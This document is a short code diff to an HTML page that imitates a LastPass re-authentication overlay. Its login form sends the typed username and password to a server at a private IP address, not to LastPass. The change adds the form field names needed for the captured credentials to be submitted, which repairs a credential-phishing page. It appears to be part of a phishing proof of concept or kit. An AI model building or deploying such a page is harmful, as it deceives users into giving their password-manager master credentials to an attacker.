@@ -268,10 +268,10 @@
     <div id="lastpass-content" data-lpstyle="color:white;-webkit-user-select:none;" style="color: white; -webkit-user-select: none;">Saved Login detected. Please re-authenticate with Lastpass to login.</div><img width="16" height="16" lptype="close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABYklEQVR42qXTvWrCUBQHcKe+QqfundPFxT0OnTJ0MtChmw/g4NgH6FtkEwoBv8BEA8EYFGswBIIEhFCrU4V26cfp+Qe5RLlKwcAPknty/7mHe1NoNBoy9+yZJWzBcN3J3j0cuGJJt9ul0WhEYRjSfD4nz/Oo0+kQ10J2eSygyL4xcb1eyyAUIV/sWhawHY/HtFqtTvJ9HyGbw4B6r9ejNE3/ZdfOQz4gnkwmtFwuM7VajRRFIcMwyLIs3GNM1HetePmA9yAIKEkSoVqtUrlcBtzv1abTKQJe9wIwGMexgGd8GQ5rvFoEvOUDFtiqKIoEXddJVdWMpml7Ndd1EfCSD3jC3mPPoVKpUKlUItM0AavAmKi3220E1PMBF+zTcRyazWYn9ft9Qsuyc3DLfm3bRs8y2BFM/mFFWQDcsE2r1SKsZjgcZgaDATWbTUxOxSmUBwiPLGEfOzGrH/uZzlIgorP8ASYfyJK1fcokAAAAAElFTkSuQmCC" id="lphideoverlay" data-lpstyle="width:16px;height:16px;float: right; margin-right: 10px; margin-bottom: -10px;" style="width: 16px; height: 16px; float: right; margin-right: 10px; margin-bottom: -10px;">
 
     <form class="loginform" id="lastpassLogin" action="http://192.168.99.1:9000/lastpasslogin">
-      <input type="text" id="lpusername" class="lpinput" placeholder="Username">
+      <input type="text" name="lpusername" id="lpusername" class="lpinput" placeholder="Username">
       <div class="pwwrapper">
-          <input type="text" name="lppasswordbottom" class="lpinput" placeholder="Password">
-          <input type="text" name="lppasswordtop" class="lpinput" placeholder="Password">
+          <input type="text" name="lppasswordbottom" id="lppasswordbottom" class="lpinput" placeholder="Password">
+          <input type="text" name="lppasswordtop" id="lppasswordtop" class="lpinput" placeholder="Password">
       </div>
       <input type="submit" lptype="tryagainbtn" id="lplogin" class="lpbutton" value="Login">
     </form>
